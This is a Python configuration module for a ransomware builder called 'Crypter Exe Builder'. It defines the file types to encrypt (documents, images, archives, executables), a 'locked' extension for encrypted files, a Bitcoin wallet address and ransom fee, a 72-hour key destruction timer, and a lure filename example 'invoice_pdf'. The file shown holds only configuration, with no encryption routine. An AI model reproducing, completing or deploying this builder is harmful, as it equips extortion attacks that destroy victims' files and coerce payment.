# -*- coding: utf-8 -*-
'''
@summary: Crypter Exe Builder: Base schema and config
@author: MLS
'''

# Import libs
import re

## DEFAULT FILETYPES TO ENCRYPT
# The default list of filetypes which can be encrypted
ENCRYPTABLE_FILETYPES = [
    # GENERAL FORMATS
    "sln",

    # IMAGE FORMATS
    "jpg", "png",

    # VIDEO FORMATS
    "mp4", "avi", "mkv",
    
    # DOCUMENT FORMATS
    "doc", "docx", "txt", "pdf",

    # SOUND FORMATS
    "mp3",

    # EXE FORMATS
    "exe", "msi", "php",

    # COMPRESSION FORMATS
    "tgz", "zip", "rar"
    ]


## CONFIGURATION
MANDATORY_CONFIG_ITEMS = {
    "builder_langauge": {
        "label": "Builder Language",
        "regex": re.compile("^.*$"),
        "example": "English or Русский",
        "config_area": "Language Settings",
        "default": "English"
        },
    "binary_langauge": {
        "label": "Crypter Binary Language",
        "regex": re.compile("^.*$"),
        "example": "English or Русский",
        "config_area": "Language Settings",
        "default": "English"
        },
    "maj_version": {
        "label": "Major Version",
        "regex": re.compile("^.+$"),
        "example": "5",
        "config_area": "Version Information"
        },
    "min_version": {
        "label": "Minor Version",
        "regex": re.compile("^.*$"),
        "example": "20",
        "config_area": "Version Information"
        },
    "filename": {
        "label": "Filename",
        "regex": re.compile("^.*$"),
        "example": "invoice_pdf",
        "config_area": "Binary Settings"
        },
    "extension": {
        "label": "Extension",
        "regex": re.compile("^.*$"),
        "example": "pdf",
        "config_area": "Binary Settings"
        }
    }

OPTIONAL_CONFIG_ITEMS = {
    "pyinstaller_aes_key": {
        "label": "PyInstaller AES Key",
        "regex": re.compile("^.*$"),
        "example": "093AC769F6557577452E9DB2C74B984A",
        "config_area": "Binary Settings"
        },
    "icon_file": {
        "label": "Icon",
        "regex": re.compile("^.*$"),
        "example": "icon.ico",
        "config_area": "Binary Settings"
        },
    "encrypted_file_extension": {
        "label": "Encrypted File Extension",
        "regex": re.compile("^.*$"),
        "example": "locked",
        "config_area": "Ransomware Settings",
        "default": "locked"
        },
    "wallet_address": {
        "label": "Wallet Address",
        "regex": re.compile("^.*$"),
        "example": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay",
        "config_area": "Ransomware Settings",
        "default": "12mdKVNfAhLbRDLtRWQFhQgydgU6bUMjay"
        },
    "bitcoin_fee": {
        "label": "Bitcoin Fee",
        "regex": re.compile("^.*$"),
        "example": "0.0897",
        "config_area": "Ransomware Settings",
        "default": "1.0"
        },
    "key_destruction_time": {
        "label": "Key Destruction Time(s)",
        "regex": re.compile("^.*$"),
        "example": "259200",
        "config_area": "Ransomware Settings",
        "default": "259200"
        },
    "max_file_size_to_encrypt": {
        "label": "Max File Size to Encrypt",
        "regex": re.compile("^.*$"),
        "example": "512",
        "config_area": "Ransomware Settings",
        "default": "512"
        },
    "filetypes_to_encrypt": {
        "label": "Filetypes to Encrypt",
        "regex": re.compile("^.*$"),
        "example": "pdf,exe,msi,doc",
        "config_area": "Ransomware Settings",
        "default": ENCRYPTABLE_FILETYPES
        }
    }

ALL_CONFIG_ITEMS = {}
ALL_CONFIG_ITEMS.update(MANDATORY_CONFIG_ITEMS)
ALL_CONFIG_ITEMS.update(OPTIONAL_CONFIG_ITEMS)

CONFIG_FILE_NAME = "BuildConfig.new"

## LANGUAGE
SUPPORTED_LANGUAGES = [
    u"English"
    #u"Русский"
    ]

DEFAULT_LANGUAGE = "English"

# English Form text
english_language_form_labels = {
    "language_settings_sizer": "Language Settings",
    }
